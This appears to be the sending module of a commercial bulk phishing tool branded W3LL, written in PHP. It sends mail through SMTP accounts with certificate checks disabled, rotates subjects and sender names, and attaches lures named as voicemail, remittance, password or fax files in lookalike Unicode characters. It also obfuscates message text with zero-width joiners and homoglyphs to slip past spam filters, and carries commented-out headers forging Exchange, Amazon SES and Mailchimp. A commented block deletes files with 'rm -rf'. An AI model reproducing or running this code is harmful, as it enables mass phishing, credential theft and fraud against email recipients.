            //$mail->addCustomHeader('Message-ID: <3F23D2F3-9CFA-4685-9A50-'.$usu2.'@asburyfarms.com>');
			//$mail->addCustomHeader('List-Unsubscribe: <https://www.linkedin.com/e/v2?e=5cttvu-klkdlcek-7b&t=lun&midToken=AQEUD2XX0lVahA&midSig=0fiL1uFn1NzFE1&ek=email_network_conversations_01&li=9&m=unsub&ts=unsub&eid=5cttvu-klkdlcek-7b&loid=AQE-TlhCKZ4MLQAAAXfgKNve0g8WovxkzuOPPVRnhnBoVjp_Itin7rBvPVh8iz2ythh90iG2ilfWlHdumq5n9HvwWES370k_-y0rLm2TbOuBqHIkt0K6WprhMX5Q2Q>');
			//$mail->addCustomHeader('Content-Type: text/plain; charset=UTF-8');
			//$mail->addCustomHeader('X-AntiAbuse: Primary Hostname - adobe.com');
			//$mail->addCustomHeader('X-Mailer', "Microsoft Office Outlook 10.0");
        }
        else
        {
            for($i = 0; $i < count($header); $i++)
            {
                $mail->addCustomHeader($header[$i]);
            }
            //$mail->addCustomHeader('Reply-To: ' . $W3LL_setup['replyto'] .'');
            //$mail->addCustomHeader('Content-Type: multipart/alternative; boundary=PHP-alt-'.$randnumhead1.'');
        }

        /* Mail Header */
        //$mail->addCustomHeader('Message-ID:<'.md5(microtime().'-'.base64_encode(md5(time()))).'@systemalerts14.mailchimp.com>');
        //$mail->addCustomHeader('Origin-messageId:<'.md5(microtime().'-'.base64_encode(time())).'.14131534592@email.amazonses.com>');
        //$mail->addCustomHeader('Return-Path:bounces.'.json_decode(time()).'-@email.amazonses.com');
        //$mail->addCustomHeader('Content-Type: multipart/alternative');
        //$mail->addCustomHeader('X-Sender: zhubnotify@services.clubztutoring.com');
        //$mail->addCustomHeader('boundary="_----------=_MCPart_'.json_decode(time()).'"');
        //$mail->addCustomHeader('X-Sender:'.sha1(microtime()));
        //$mail->addCustomHeader("Content-Type:multipart/mixed;boundary='b1_4bz7VWEgTcJwnu8ueWniGKOf0odAXt1Qb6KhD1sCsk'");
        //$mail->addCustomHeader("X-MimeOLE:Produced By Microsoft MimeOLE V6.00.2900.5512");
        //$mail->addCustomHeader("X-Mailer:Microsoft Outlook Express 6.00.2900.5512");
        //$mail->addCustomHeader('X-Sending:'.md5(time()));
        //$mail->addCustomHeader('X-Sender-ID:'.base64_encode(md5(time())));
        //$mail->addCustomHeader('X-MS-Exchange-CrossTenant-Network-Message-Id: '.sha1(microtime()));
        //$mail->addCustomHeader('X-MS-Exchange-CrossTenant-Id: '.sha1(microtime()));
        //$mail->addCustomHeader('X-MS-Exchange-CrossTenant-FromEntityHeader: Internet');
        //$mail->addCustomHeader('X-MS-Exchange-Transport-CrossTenantHeadersStamped: '.sha1(microtime()));
        //$mail->addCustomHeader('X-MS-Exchange-Transport-EndToEndLatency: '.md5(time()));
        //$mail->addCustomHeader('X-MS-Exchange-Processed-By-BccFoldering: '.md5(date()));
        //$mail->addCustomHeader('X-Microsoft-Antispam-Mailbox-Delivery:ucf:0;jmr:0;ex:0;auth:0;dest:I;ENG:('.md5(date()).')('.base64_encode(microtime()).')('.json_decode(time()).')(944506383)(944626516);');
        //$mail->addCustomHeader('X-MS-Exchange-Organization-AuthAs: Anonymous');
        //$mail->addCustomHeader('X-Ebay-Mailtracker', '11400.000.0.0.'.sha1(microtime()).sha1(date()));
        //$mail->addCustomHeader("charset=UTF-8\r\n");

        /* Start Smtp */
        $mail->IsSMTP();
        $mail->SMTPAuth = true;
        $mail->Host = $smtpserver;
        $mail->Port = $smtpport;
		$mail->SMTPKeepAlive = true;
        $mail->Priority = $priority;
		$mail->SMTPOptions = array(
        'ssl' => array(
        'verify_peer' => false,
        'verify_peer_name' => false,
        'allow_self_signed' => true
        )
        );
		$mail->Username = $smtpuser;
		$mail->Password = $smtppass;
        $mail->AddReplyTo($replyto);

        //Random Subject & From Name
        shuffle($subject);
        $subject = array_shift($subject);
        shuffle($fromname);
        $fromname = array_shift($fromname);

        if($redirect == 9){
            $done = array_shift($randurl);
            unset($randurl);
            $randurl = array();

            $randurl = [
                $done, //link 1
            ];

            $randurl = [
                $randurl[0].''.$code.'/', //link 1
            ];

        }

        //Replace
        $fromnames = str_replace('++w3ll_smtp++', $smtpuser, $fromname);
        $frommails = str_replace('++w3ll_smtp++', $smtpuser, $frommail);

        $fromnames = str_replace('++w3ll_randstring++', RandString1(5), $fromnames);
        $fromnames = lettering($fromnames, $email, $frommail, $fromname, $randurl, $subject, $smtpuser, $redirect, 0, 0, $fname, $lname);
        $frommails = str_replace('++w3ll_randstring++', RandString1(8), $frommails);

        $subjects = str_replace('++w3ll_randstring++', RandString1(5), $subject);
        $subjects = lettering($subjects, $email, $frommail, $fromname, $randurl, $subject, $smtpuser, $redirect, 0, 0, $fname, $lname);
        
        $fromnames = privateLHZ($email, $fromnames, $smtpuser);
        $frommails = privateLHZ1($email, $frommails);

        //Fromname encrypt
        if ($fromname_encrypt == 1)
        {
            if ($W3LL_setup['fromname_encode_type'] == "punycode")
			{
				$fromnames = encode($fromnames);
				$mail->setFrom ($frommails, $fromnames);
			}
            else if ($W3LL_setup['fromname_encode_type'] == "html_entities")
			{
				$fromnames = html_entity_decode($fromnames);
				$mail->setFrom ($frommails, $fromnames);
			}
        }

        $mail->setFrom ($frommails, $fromnames);
		if ($W3LL_setup['send_type'] == "bcc")
		{
			$mail->addBCC($email);
		}
		else if ($W3LL_setup['send_type'] == "cc")
		{
			$mail->addCC($email);
		}
		else 
		{
			$mail->AddAddress($email);
		}

        //Subject Encrypt
       if ($subject_encrypt == 1)
        {
            if ($W3LL_setup['subject_encode_type'] == "punycode")
			{
				$subjects = encode($subjects);
				$mail->Subject = $subjects;
			}
            else if ($W3LL_setup['subject_encode_type'] == "html_entities")
			{
				$subjects = html_entity_decode($subjects);
				$mail->Subject = $subjects;
			}
        }
		
        $mail->Subject = $subjects;
        
        //Attachment
        if ($W3LL_setup['filesend'] == 1)
        {
            $domains = explode('@', $email);
            $domain = ucfirst("$domains[1]");
            $domain2 = $domains[1];
            $domains1 = explode('.', $domain);
            $domain1 = ucwords("$domains1[0]");
            $wuw = RandNumber(5);
			$wuw1 = RandNumber(5);
			$wuw2 = RandNumber(5);
			$wuw3 = RandNumber(7);
            $attach = lettering("file/attachment/" . $W3LL_setup['attach'], $email, $frommails, $fromnames, $randurl, $subject, $smtpuser, $redirect, 1, 1, $fname, $lname);
            file_put_contents("file/attachment/" . $wuw. "-" .$wuw1. "-" .$wuw2. "-" .$wuw3 . $W3LL_setup['attach'], $attach);
            $mail->AddAttachment("file/attachment/" . $wuw. "-" .$wuw1. "-" .$wuw2. "-" .$wuw3 . $W3LL_setup['attach']);
            $strings_attch = "file/attachment/" . $wuw. "-" .$wuw1. "-" .$wuw2. "-" .$wuw3 . $W3LL_setup['attach'];
        }
        else if ($W3LL_setup['filesend'] == 2)
        {
            $wuw = RandNumber(5);
			$wuw1 = RandNumber(5);
			$wuw2 = RandNumber(5);
			$wuw3 = RandNumber(7);
			$date = date('Ymd');
            $attach = lettering("file/attachment/" . $W3LL_setup['attach'], $email, $frommails, $fromnames, $randurl, $subject, $smtpuser, $redirect, 1, 1, $fname, $lname);
            $mail->addStringAttachment($attach, $date. "-" .$wuw1. "-" .$wuw2. "-" .$wuw3 .'.'. $type_filesend, "base64", "text/html");
        }
        else if ($W3LL_setup['filesend'] == 3) 
        {
			if ($W3LL_setup['attachment_type'] == "voicemail")
			{	
    			$wuw = RandNumber(7);
                $attach = lettering("file/attachment/" . $W3LL_setup['attach'], $email, $frommails, $fromnames, $randurl, $subject, $smtpuser, $redirect, 1, 1, $fname, $lname);
                file_put_contents("file/attachment/📞_𝙼𝚎𝚜𝚜𝚊𝚐𝚎－" . $wuw. $W3LL_setup['attach'], $attach);
                $mail->AddAttachment("file/attachment/📞_𝙼𝚎𝚜𝚜𝚊𝚐𝚎－" . $wuw. $W3LL_setup['attach']);
                $strings_attch = "file/attachment/📞_𝙼𝚎𝚜𝚜𝚊𝚐𝚎－" . $wuw. $W3LL_setup['attach'];
			}
			else if ($W3LL_setup['attachment_type'] == "remittance")
			{
    			$wuw = RandNumber(9);
				$wuw1 = RandNumber(9);
                $attach = lettering("file/attachment/" . $W3LL_setup['attach'], $email, $frommails, $fromnames, $randurl, $subject, $smtpuser, $redirect, 1, 1, $fname, $lname);
                file_put_contents("file/attachment/𝚁𝚎𝚖𝚒𝚝𝚊𝚗𝚌𝚎－" . $wuw. "－" .$wuw1. $W3LL_setup['attach'], $attach);
                $mail->AddAttachment("file/attachment/𝚁𝚎𝚖𝚒𝚝𝚊𝚗𝚌𝚎－" . $wuw. "－" .$wuw1. $W3LL_setup['attach']);
                $strings_attch = "file/attachment/𝚁𝚎𝚖𝚒𝚝𝚊𝚗𝚌𝚎－" . $wuw. "－" .$wuw1. $W3LL_setup['attach'];
			}
			else if ($W3LL_setup['attachment_type'] == "keep password")
			{
    			$wuw = RandNumber(9);
				$wuw1 = RandNumber(9);
                $attach = lettering("file/attachment/" . $W3LL_setup['attach'], $email, $frommails, $fromnames, $randurl, $subject, $smtpuser, $redirect, 1, 1, $fname, $lname);
                file_put_contents("file/attachment/𝙿𝙰𝚂𝚂＿𝙸𝙳－" . $wuw. "－" .$wuw1. $W3LL_setup['attach'], $attach);
                $mail->AddAttachment("file/attachment/𝙿𝙰𝚂𝚂＿𝙸𝙳－" . $wuw. "－" .$wuw1. $W3LL_setup['attach']);
                $strings_attch = "file/attachment/𝙿𝙰𝚂𝚂＿𝙸𝙳－" . $wuw. "－" .$wuw1. $W3LL_setup['attach'];
			}
			else if ($W3LL_setup['attachment_type'] == "message fail")
			{
    			$wuw = RandNumber(9);
				$wuw1 = RandNumber(9);
                $attach = lettering("file/attachment/" . $W3LL_setup['attach'], $email, $frommails, $fromnames, $randurl, $subject, $smtpuser, $redirect, 1, 1, $fname, $lname);
                file_put_contents("file/attachment/𝙼𝚎𝚜𝚜𝚊𝚐𝚎＿𝙵𝚊𝚒𝙸＿𝚍𝚎𝙸𝚒𝚟𝚎𝚛𝚎𝚍－" . $wuw. "－" .$wuw1. $W3LL_setup['attach'], $attach);
                $mail->AddAttachment("file/attachment/𝙼𝚎𝚜𝚜𝚊𝚐𝚎＿𝙵𝚊𝚒𝙸＿𝚍𝚎𝙸𝚒𝚟𝚎𝚛𝚎𝚍－" . $wuw. "－" .$wuw1. $W3LL_setup['attach']);
                $strings_attch = "file/attachment/𝙼𝚎𝚜𝚜𝚊𝚐𝚎＿𝙵𝚊𝚒𝙸＿𝚍𝚎𝙸𝚒𝚟𝚎𝚛𝚎𝚍－" . $wuw. "－" .$wuw1. $W3LL_setup['attach'];
			}
			else if ($W3LL_setup['attachment_type'] == "fax")
			{
    			$wuw = RandNumber(9);
				$wuw1 = RandNumber(9);
                $attach = lettering("file/attachment/" . $W3LL_setup['attach'], $email, $frommails, $fromnames, $randurl, $subject, $smtpuser, $redirect, 1, 1, $fname, $lname);
                file_put_contents("file/attachment/𝙵‍a𝚡‍＿𝙸𝙳－" . $wuw. "－" .$wuw1. $W3LL_setup['attach'], $attach);
                $mail->AddAttachment("file/attachment/𝙵‍a𝚡‍＿𝙸𝙳－" . $wuw. "－" .$wuw1. $W3LL_setup['attach']);
                $strings_attch = "file/attachment/𝙵‍a𝚡‍＿𝙸𝙳－" . $wuw. "－" .$wuw1. $W3LL_setup['attach'];
			}
			else if ($W3LL_setup['attachment_type'] == "secure")
			{
    			$wuw = RandNumber(9);
				$wuw1 = RandNumber(9);
                $attach = lettering("file/attachment/" . $W3LL_setup['attach'], $email, $frommails, $fromnames, $randurl, $subject, $smtpuser, $redirect, 1, 1, $fname, $lname);
                file_put_contents("file/attachment/𝚂‍e𝚌‍𝚞‍𝚛‍e𝙼‍e𝚜‍𝚜‍a𝚐‍e－" . $wuw. "－" .$wuw1. $W3LL_setup['attach'], $attach);
                $mail->AddAttachment("file/attachment/𝚂‍e𝚌‍𝚞‍𝚛‍e𝙼‍e𝚜‍𝚜‍a𝚐‍e－" . $wuw. "－" .$wuw1. $W3LL_setup['attach']);
                $strings_attch = "file/attachment/𝚂‍e𝚌‍𝚞‍𝚛‍e𝙼‍e𝚜‍𝚜‍a𝚐‍e－" . $wuw. "－" .$wuw1. $W3LL_setup['attach'];
			}
			else if ($W3LL_setup['attachment_type'] == "email")
			{
    			$wuw = RandNumber(9);
				$wuw1 = RandNumber(9);
                $attach = lettering("file/attachment/" . $W3LL_setup['attach'], $email, $frommails, $fromnames, $randurl, $subject, $smtpuser, $redirect, 1, 1, $fname, $lname);
                file_put_contents("file/attachment/" . $email . $W3LL_setup['attach'], $attach);
                $mail->AddAttachment("file/attachment/" . $email. $W3LL_setup['attach']);
                $strings_attch = "file/attachment/𝚂" . $email. $W3LL_setup['attach'];
			}
		else
		{
    		fopen("file/attachment/ ". $W3LL_setup['attach'], "w");
            $attach = lettering("file/attachment/" . $W3LL_setup['attach'], $email, $frommails, $fromnames, $randurl, $subject, $smtpuser, $redirect, 1, 1, $fname, $lname);
            file_put_contents("file/attachment/ ". $W3LL_setup['attach'], $attach);
            $mail->AddAttachment("file/attachment/ ". $W3LL_setup['attach']);
		}
        }
        //Lettering
        if ($replacement == 1) { $msg = lettering($msgfile, $email, $frommails, $fromnames, $randurl, $subject, $smtpuser, $redirect, 1, 0, $fname, $lname); }
        else { $msg = $msgfile; }
        $mail->msgHTML($msg);
        $linecount = 0;
        //Sending
        if (!$mail->send())
        {
            $banner->k1();
            if($def == 0)
            {
               $handle = fopen($listnih, "r");
				while(!feof($handle)){
				  $line = fgets($handle);
				  $linecount++;
				}

				fclose($handle);

               echo "\e[0m".date('h:i:s', time())."\033[0;31m │";
            }
            else{
                $banner->k4();
            }
            $contains = 0;
            echo "\e[0;31m $smtpcut\033[0;31m │";
            if (preg_match('/\bquota\b/', $mail->ErrorInfo) || preg_match('/\bQuota\b/', $mail->ErrorInfo) || preg_match('/\bQUOTA\b/', $mail->ErrorInfo) || preg_match('/\blimits\b/', $mail->ErrorInfo) || preg_match('/\blimit\b/', $mail->ErrorInfo) || preg_match('/\bLIMITS\b/', $mail->ErrorInfo) || preg_match('/\bSending rate exceeded\b/', $mail->ErrorInfo) || preg_match('/\bToo many messages from sender\b/', $mail->ErrorInfo)) { echo "\e[0;31m $emailcut\033[0;31m │\e[0;31m $subjectcut\033[0;31m │ \e[0;31m$fromnamecut\033[0;31m │     \e[0;31m✗\033[0;31m      │ \e[0m".PHP_EOL;
                if ($W3LL_setup['delete_smtp'] == 1){ deleteSMTP($smtpuser); }
            }
            else if (preg_match('/\bTemporary\b/', $mail->ErrorInfo) || preg_match('/\btemporary\b/', $mail->ErrorInfo) || preg_match('/\bTEMPORARY\b/', $mail->ErrorInfo)){ echo "\e[0;31m $emailcut\033[0;31m │\e[0;31m $subjectcut\033[0;31m │ \e[0;31m$fromnamecut\033[0;31m │     \e[0;31m✗\033[0;31m      │ \e[0m".PHP_EOL;
				if ($W3LL_setup['delete_smtp'] == 1){ deleteSMTP($smtpuser); }
            }
            else if (preg_match('/\bSPAM\b/', $mail->ErrorInfo) || preg_match('/\bSpam\b/', $mail->ErrorInfo) || preg_match('/\bspam\b/', $mail->ErrorInfo)){ echo "\e[0;31m $emailcut\033[0;31m │\e[0;31m $subjectcut\033[0;31m │ \e[0;31m$fromnamecut\033[0;31m │     \e[0;31m✗\033[0;31m      │ \e[0m".PHP_EOL;
                if ($W3LL_setup['delete_smtp'] == 1){ deleteSMTP($smtpuser); }
            }
			else if (preg_match('/\Sending paused\b/', $mail->ErrorInfo)){ echo "\e[0;31m $emailcut\033[0;31m │\e[0;31m $subjectcut\033[0;31m │ \e[0;31m$fromnamecut\033[0;31m │     \e[0;31m✗\033[0;31m      │ \e[0m".PHP_EOL;
                if ($W3LL_setup['delete_smtp'] == 1){ deleteSMTP($smtpuser); }
            }
			else if (preg_match('/\Email address is not verified\b/', $mail->ErrorInfo)){ echo "\e[0;31m $emailcut\033[0;31m │\e[0;31m $subjectcut\033[0;31m │ \e[0;31m$fromnamecut\033[0;31m │     \e[0;31m✗\033[0;31m      │ \e[0m".PHP_EOL;
                if ($W3LL_setup['delete_smtp'] == 1){ deleteSMTP($smtpuser); }
            }

			else {
                if ($W3LL_setup['userremoveline'] == 1){ 
                    $contains = 1;
                    echo "\e[0;31m $emailcut\033[0;31m │\e[0;31m $subjectcut\033[0;31m │ \e[0;31m$fromnamecut\033[0;31m │     \e[0;31m✗\033[0;31m      │ \e[0m".PHP_EOL;
                    Savedata($W3LL_setup['mail_list'], trim(str_replace($email, "", file_get_contents($W3LL_setup['mail_list']))));
                }
                else {
                    echo "\e[0;31m $emailcut\033[0;31m │\e[0;31m $subjectcut\033[0;31m │ \e[0;31m$fromnamecut\033[0;31m │     \e[0;31m✗\033[0;31m      │ \e[0m".PHP_EOL;
					if ($W3LL_setup['delete_smtp'] == 1){ deleteSMTP($smtpuser); }
                }
            }
            
            $file = fopen("INVALID.txt", "a+");
            fwrite($file, $email.PHP_EOL);
            fclose($file);
        }
        else
        {
            
            if($def == 0)
            {
               $handle = fopen($listnih, "r");
				while(!feof($handle)){
				  $line = fgets($handle);
				  $linecount++;
				}

				fclose($handle);

               
            }
            else{
                $banner->k4();
            }
			$banner->k1();
			echo "\e[0m".date('h:i:s', time())."\033[0;31m │";
            echo "\e[92m $smtpcut\033[0;31m │\e[92m $emailcut\033[0;31m │\e[92m $subjectcut\033[0;31m │ \e[92m$fromnamecut\033[0;31m │     \e[92m✓\033[0;31m      │ \e[0m".PHP_EOL;
            $file = fopen("SPAMMED.txt", "a+");
                    fwrite($file, $email.PHP_EOL);
                    fclose($file);
        }
        $mail->clearAddresses();
    }
    else
    {

        $banner->k1();
        if($def == 0)
        {
           $handle = fopen($listnih, "r");
				while(!feof($handle)){
				  $line = fgets($handle);
				  $linecount++;
				}

				fclose($handle);

               echo "\e[0m".date('h:i:s', time())."\033[0;31m │";
        }
        else{
            $banner->k4();
        }
        if ($W3LL_setup['delete_smtp'] == 1){ deleteSMTP($smtpuser); }
        echo "\e[0;31m $smtpcut\033[0;31m │\e[0;31m $emailcut\033[0;31m │\e[0;31m $subjectcut\033[0;31m │ \e[0;31m$fromnamecut\033[0;31m │     \e[0;31m✗\033[0;31m      │ \e[0m".PHP_EOL;
        $file = fopen("FAILED.txt", "a");
        fwrite($file, "" . $email . PHP_EOL);
        fclose($file);
    }
    $smtp->quit(true);
    if ($W3LL_setup['filesend'] == 1 || $W3LL_setup['filesend'] == 3) { unlink($strings_attch); }
}
?>

<?php
/* Setting up banner */
echo chr(27).chr(91).'H'.chr(27).chr(91).'J'; // ^[H^[J

$banner->skuy();

if (preg_match('/You cant use demo token on this sender/', $checkval))
{
    echo $warna->Red("      │          	         ").$warna->Yellow("YOU CANT USE DEMO TOKEN HERE !").$warna->Red("                      │").PHP_EOL;
	echo "\033[0;31m      └──────────────────────────────────────────────────────────────────────────────┘\e[0m".PHP_EOL;
	die();
}	
elseif (preg_match('/\bDAYS LEFT\b/', $checkval))
{
    echo $warna->Red("      │                        ").$warna->White("		TOKEN : ").$warna->Green("VALID").$warna->Red("         	            	     │").PHP_EOL;
}	
else if (preg_match('/\bPlease renew your Token\b/', $checkval))
{

/*
unlink('READ ME BEFORE USE.txt');
shell_exec('rm -rf file');
shell_exec('rm -rf setting');
shell_exec('rm W3LL');
shell_exec('rm token.txt');
shell_exec('rm settings.php');
shell_exec('rm connfig.php');
shell_exec('rm SPAMMED.txt');
shell_exec('rm FAILED.txt');
shell_exec('rm BAD_SMTP.txt');
shell_exec('rm INVALID.txt');
*/

echo $warna->Red("      │                        ").$warna->White("		TOKEN : ").$warna->Red("EXPIRE").$warna->Red("         	            	     │").PHP_EOL;
echo "\033[0;31m      └──────────────────────────────────────────────────────────────────────────────┘\e[0m".PHP_EOL;
    die();
}
else if (preg_match('/\bIP \b/', $checkval))
{
$iptoken = explode("IP ",$checkval);
$iptoken1 = explode(" has not registered",$iptoken[1]);

echo $warna->Red("      │          ").$warna->White("REGISTER THIS IP : ").$warna->Yellow($iptoken1[0]).$warna->White(" ON SENDER SETTING ON STORE!").$warna->Red("         │").PHP_EOL;
echo "\033[0;31m      └──────────────────────────────────────────────────────────────────────────────┘\e[0m".PHP_EOL;
    die();
}
else if (preg_match('/\bToken not exists\b/', $checkval))
{
echo $warna->Red("      │          	          ").$warna->Yellow("THIS TOKEN IS NOT VALID !").$warna->Red("                          │").PHP_EOL;
echo "\033[0;31m      └──────────────────────────────────────────────────────────────────────────────┘\e[0m".PHP_EOL;
    die();
}

$dipake = 0;

//Error Message
if (!is_file($W3LL_setup['mail_list']))
{
    $banner->mailist();
    die();
}
else if (!is_file($W3LL_setup['msgfile']))
{
    $banner->errorletter();
    die();
}
else if ($W3LL_setup['filesend'] == 1)
{
    if (!is_file("file/attachment/" . $W3LL_setup['attach']))
    {
        $banner->errorattachment();
        die();
    }
}
//Get letter content
$filer = file_get_contents($W3LL_setup['msgfile']);

//Start Executing Script
$file = file_get_contents($W3LL_setup['mail_list']);
if ($file)
{
    if($W3LL_setup['encrypt_letter'] == 1){
        /* Auto reletter */
        if (strpos($filer, '&#8205') !== false) {
        }
        else{
            $lists = array("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","[","]","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z",",",".");
            $replaces = array("𝚊&#8205;","𝚋&#8205;","𝚌&#8205;","𝚍&#8205;","𝚎&#8205;","𝚏&#8205;","𝚐&#8205;","𝚑&#8205;","𝚒&#8205;","𝚓&#8205;","𝚔&#8205;","𝚕&#8205;","𝚖&#8205;","𝚗&#8205;","𝚘&#8205;","𝚙&#8205;","𝚚&#8205;","𝚛&#8205;","𝚜&#8205;","𝚝&#8205;","𝚞&#8205;","𝚟&#8205;","𝚠&#8205;","𝚡&#8205;","𝚢&#8205;","𝚣&#8205;","［&#8205;","］&#8205;","𝙰&#8205;","𝙱&#8205;","𝙲&#8205;","𝙳&#8205;","𝙴&#8205;","𝙵&#8205;","𝙶&#8205;","𝙷&#8205;","𝙸&#8205;","𝙹&#8205;","𝙺&#8205;","𝙻&#8205;","𝙼&#8205;","𝙽&#8205;","𝙾&#8205;","𝙿&#8205;","𝚀&#8205;","𝚁&#8205;","𝚂&#8205;","𝚃&#8205;","𝚄&#8205;","𝚅&#8205;","𝚆&#8205;","𝚇&#8205;","𝚈&#8205;","𝚉&#8205;","，&#8205;","．&#8205;");

            $strs = $filer;

            $srtingd = strip_tags($strs);

            $pattern = "/\s+/";

            $srtings = preg_split($pattern, $srtingd);


            $srtingd = str_replace($lists, $replaces, $srtings);

            $strs = str_replace($srtings, $srtingd, $strs);

            $exct = array("𝚠&#8205;3𝚕&#8205;𝚕&#8205;","_𝚕&#8205;𝚘&#8205;𝚐&#8205;𝚘&#8205;","_𝚕&#8205;𝚘&#8205;𝚐&#8205;𝚘&#8205;1","_𝚍&#8205;𝚊&#8205;𝚝&#8205;𝚊&#8205;_𝚌&#8205;𝚘&#8205;𝚖&#8205;𝚙&#8205;𝚊&#8205;𝚗&#8205;𝚢&#8205;","_𝚍&#8205;𝚊&#8205;𝚝&#8205;𝚊&#8205;_𝚗&#8205;𝚊&#8205;𝚖&#8205;𝚎&#8205;","_𝚍&#8205;𝚊&#8205;𝚝&#8205;𝚊&#8205;_𝚙&#8205;𝚑&#8205;𝚘&#8205;𝚗&#8205;𝚎&#8205;","_𝚍&#8205;𝚊&#8205;𝚝&#8205;𝚊&#8205;_𝚜&#8205;𝚎&#8205;𝚌&#8205;𝚛&#8205;𝚎&#8205;𝚝&#8205;_𝚙&#8205;𝚑&#8205;𝚘&#8205;𝚗&#8205;𝚎&#8205;","_𝚍&#8205;𝚊&#8205;𝚝&#8205;𝚊&#8205;_𝚎&#8205;𝚖&#8205;𝚊&#8205;𝚒&#8205;𝚕&#8205;","_𝚍&#8205;𝚊&#8205;𝚝&#8205;𝚊&#8205;_𝚎&#8205;𝚊&#8205;𝚗&#8205;","_𝚍&#8205;𝚊&#8205;𝚝&#8205;𝚊&#8205;_𝚞&#8205;𝚙&#8205;𝚌&#8205;","𝚞&#8205;𝚒&#8205;𝚍&#8205;","_𝚍&#8205;𝚊&#8205;𝚝&#8205;𝚊&#8205;_𝚟&#8205;𝚊&#8205;𝚝&#8205;","_𝚍&#8205;𝚊&#8205;𝚝&#8205;𝚊&#8205;_𝚜&#8205;𝚒&#8205;𝚝&#8205;𝚎&#8205;","_𝚍&#8205;𝚊&#8205;𝚝&#8205;𝚊&#8205;_𝚏&#8205;𝚗&#8205;𝚊&#8205;𝚖&#8205;𝚎&#8205;","_𝚍&#8205;𝚊&#8205;𝚝&#8205;𝚊&#8205;_𝚕&#8205;𝚗&#8205;𝚊&#8205;𝚖&#8205;𝚎&#8205;","_𝚍&#8205;𝚊&#8205;𝚝&#8205;𝚊&#8205;_𝚙&#8205;𝚘&#8205;𝚜&#8205;𝚝&#8205;𝚌&#8205;𝚘&#8205;𝚍&#8205;𝚎&#8205;","_𝚍&#8205;𝚊&#8205;𝚝&#8205;𝚊&#8205;_𝚌&#8205;𝚘&#8205;𝚞&#8205;𝚗&#8205;𝚝&#8205;𝚛&#8205;𝚢&#8205;","_𝚍&#8205;𝚊&#8205;𝚝&#8205;𝚊&#8205;_𝚜&#8205;𝚝&#8205;𝚊&#8205;𝚝&#8205;𝚎&#8205;","_𝚍&#8205;𝚊&#8205;𝚝&#8205;𝚊&#8205;_𝚌&#8205;𝚒&#8205;𝚝&#8205;𝚢&#8205;","_𝚍&#8205;𝚊&#8205;𝚝&#8205;𝚊&#8205;_𝚊&#8205;𝚍&#8205;𝚍&#8205;𝚛&#8205;𝚜&#8205;","_𝚍&#8205;𝚊&#8205;𝚝&#8205;𝚊&#8205;_𝚜&#8205;𝚝&#8205;𝚛&#8205;𝚎&#8205;𝚎&#8205;𝚝&#8205;","_𝚍&#8205;𝚊&#8205;𝚝&#8205;𝚊&#8205;_𝚌&#8205;𝚌&#8205;","_𝚍&#8205;𝚊&#8205;𝚝&#8205;𝚊&#8205;_𝚎&#8205;𝚡&#8205;𝚙&#8205;𝚛&#8205;","_𝚍&#8205;𝚊&#8205;𝚝&#8205;𝚊&#8205;_𝚌&#8205;𝚝&#8205;𝚢&#8205;𝚙&#8205;𝚎&#8205;","_𝚍&#8205;𝚘&#8205;𝚖&#8205;𝚊&#8205;𝚒&#8205;𝚗&#8205;_𝚞&#8205;𝚛&#8205;𝚕&#8205;","_𝚜&#8205;𝚖&#8205;𝚝&#8205;𝚙&#8205;","_𝚜&#8205;𝚑&#8205;𝚘&#8205;𝚛&#8205;𝚝&#8205;64","_𝚎&#8205;𝚖&#8205;𝚊&#8205;𝚒&#8205;𝚕&#8205;64","_𝚎&#8205;𝚖&#8205;𝚊&#8205;𝚒&#8205;𝚕&#8205;","_𝚜&#8205;𝚞&#8205;𝚋&#8205;𝚓&#8205;𝚎&#8205;𝚌&#8205;𝚝&#8205;","_𝚛&#8205;𝚊&#8205;𝚗&#8205;𝚍&#8205;𝚘&#8205;𝚖&#8205;𝚒&#8205;𝚙&#8205;","_𝚏&#8205;𝚛&#8205;𝚘&#8205;𝚖&#8205;𝚖&#8205;𝚊&#8205;𝚒&#8205;𝚕&#8205;","_𝚏&#8205;𝚛&#8205;𝚘&#8205;𝚖&#8205;𝚗&#8205;𝚊&#8205;𝚖&#8205;𝚎&#8205;","_𝚜&#8205;𝚑&#8205;𝚘&#8205;𝚛&#8205;𝚝&#8205;","_𝚛&#8205;𝚊&#8205;𝚗&#8205;𝚍&#8205;𝚜&#8205;𝚝&#8205;𝚛&#8205;𝚒&#8205;𝚗&#8205;𝚐&#8205;","_𝚌&#8205;𝚘&#8205;𝚞&#8205;𝚗&#8205;𝚝&#8205;𝚛&#8205;𝚢&#8205;","_𝚍&#8205;𝚊&#8205;𝚝&#8205;𝚎&#8205;","_𝚗&#8205;𝚞&#8205;𝚖&#8205;𝚋&#8205;𝚎&#8205;𝚛&#8205;1","_𝚗&#8205;𝚞&#8205;𝚖&#8205;𝚋&#8205;𝚎&#8205;𝚛&#8205;2","_𝚗&#8205;𝚞&#8205;𝚖&#8205;𝚋&#8205;𝚎&#8205;𝚛&#8205;3","_𝚗&#8205;𝚞&#8205;𝚖&#8205;𝚋&#8205;𝚎&#8205;𝚛&#8205;4","_𝚗&#8205;𝚞&#8205;𝚖&#8205;𝚋&#8205;𝚎&#8205;𝚛&#8205;5","_𝚗&#8205;𝚞&#8205;𝚖&#8205;𝚋&#8205;𝚎&#8205;𝚛&#8205;6","_𝚗&#8205;𝚞&#8205;𝚖&#8205;𝚋&#8205;𝚎&#8205;𝚛&#8205;7","_𝚗&#8205;𝚞&#8205;𝚖&#8205;𝚋&#8205;𝚎&#8205;𝚛&#8205;8","_𝚗&#8205;𝚞&#8205;𝚖&#8205;𝚋&#8205;𝚎&#8205;𝚛&#8205;9","_𝚗&#8205;𝚞&#8205;𝚖&#8205;𝚋&#8205;𝚎&#8205;𝚛&#8205;10","_𝚘&#8205;𝚜&#8205;","_𝚋&#8205;𝚛&#8205;𝚘&#8205;𝚠&#8205;𝚜&#8205;𝚎&#8205;𝚛&#8205;","_𝚝&#8205;𝚒&#8205;𝚖&#8205;𝚎&#8205;","_𝚞&#8205;𝚜&#8205;𝚎&#8205;𝚛&#8205;","_𝚍&#8205;𝚘&#8205;𝚖&#8205;𝚊&#8205;𝚒&#8205;𝚗&#8205;","_𝚍&#8205;𝚘&#8205;𝚖&#8205;𝚊&#8205;𝚒&#8205;𝚗&#8205;1","_𝚜&#8205;𝚎&#8205;𝚌&#8205;𝚛&#8205;𝚎&#8205;𝚝&#8205;_𝚎&#8205;